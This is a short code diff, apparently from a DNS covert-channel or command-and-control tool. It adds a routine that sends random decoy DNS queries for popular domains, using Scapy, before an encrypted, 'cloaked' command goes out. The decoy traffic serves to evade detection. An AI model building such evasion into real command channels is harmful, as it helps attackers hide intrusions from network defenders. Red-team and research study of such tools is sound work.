@@ -24,6 +24,16 @@ cipher = "ciphers\\common_fqdn\\topWebsites"
 command = None
 
 def send_command(command, dns='localhost', args=None):
+    # Initilize number of random fqdns to be discarded after the command is sent
+    rnd_fqdn = random.randint(1, 5)
+    # pick random fqdn from cipher file
+    for i in range(rnd_fqdn):
+        fqdn_str = random.choice(open(cipher).readlines()).strip()
+        dns_req = IP(dst=dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(unicastresponse=1, qname=fqdn_str))
+        dns_req[DNS].id = rnd_fqdn+65530
+        send(dns_req, verbose=0)
+        rnd_fqdn -= 1
+
     encrypted_command = encrypt_message(command, key) if args is not None and args.encrypt else command
     cloaked_command = "cloaked_command.txt"
     
